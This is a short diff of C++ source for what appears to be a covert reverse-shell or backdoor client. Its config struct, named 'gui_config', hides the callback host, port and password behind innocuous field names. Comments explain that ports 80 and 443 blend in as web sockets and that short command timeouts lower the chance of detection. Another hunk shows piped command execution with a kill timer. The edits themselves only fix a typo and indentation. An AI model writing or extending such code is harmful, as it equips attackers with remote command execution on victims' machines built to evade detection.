@@ -25,7 +25,7 @@ struct gui_config{
     const string client_patch = "127.0.0.1"; // host to call back to
     const string client_buffer = "22123"; // port to call back to port 80 and 443 will look like web sockets
     const string client_key = "lolpass"; // password
-    const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
+    const string client_time_out = "1"; // amount of time til a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
 class gui_bar{
@@ -48,8 +48,8 @@ class gui_bar{
             if(time(NULL) >= end){
               free(buff);
               pclose(in); 
-				      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
-		      	}
+	      return  out + "\nKilled command since it took longer than " + string(gc.client_time_out) + " Seconds\n";
+            }
           }
           free(buff);
           pclose(in); 
